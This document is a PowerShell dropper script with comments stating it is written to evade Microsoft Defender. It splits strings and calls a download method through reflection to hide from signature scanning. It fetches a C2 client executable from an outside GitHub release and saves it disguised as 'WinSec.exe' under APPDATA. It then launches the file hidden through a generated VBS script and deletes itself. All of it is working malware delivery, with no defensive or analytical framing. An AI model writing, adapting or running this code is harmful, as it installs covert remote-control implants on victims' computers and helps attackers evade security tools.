# obfuscated run.ps1 — harder for Defender to read
$ErrorActionPreference = 'SilentlyContinue'

# split strings so Defender doesn't pattern match
$a = "https://github.com/IMApurbo"
$b = "/discordC2/releases/download"
$c = "/C2/c2_client.exe"
$url = $a + $b + $c

$d1 = $env:APPDATA
$d2 = "\Microsoft\Windows\"
$d3 = "Win" + "Sec.exe"
$dest = $d1 + $d2 + $d3

$ErrorActionPreference = 'SilentlyContinue'

# folder
$folder = Split-Path $dest
if (!(Test-Path $folder)) {
    New-Item -ItemType Directory -Path $folder -Force | Out-Null
}

# download — using split method name to avoid signature
$wc  = New-Object Net.WebClient
$hdr = "User" + "-" + "Agent"
$wc.Headers.Add($hdr, "Mozilla/5.0")

# call DownloadFile via reflection to avoid string detection
$method = "Download" + "File"
$wc.GetType().GetMethod($method).Invoke($wc, @($url, $dest))

# verify
if (!(Test-Path $dest)) { exit }
if ((Get-Item $dest).Length -lt 100000) { Remove-Item $dest -Force; exit }

# launch via vbs
$vbs = $d1 + $d2 + "wrun.vbs"
$line1 = 'Set o = CreateObject("WScript.Shell")'
$line2 = 'o.Run Chr(34) & "' + $dest + '" & Chr(34), 0, False'
Set-Content -Path $vbs -Value ($line1 + "`r`n" + $line2)

$ws  = "wscript" + ".exe"
$arg = "//B //Nologo `"$vbs`""
Start-Process $ws -ArgumentList $arg -WindowStyle Hidden

# self delete
$self = $MyInvocation.MyCommand.Path
if ($self) { Start-Sleep 2; Remove-Item $self -Force }
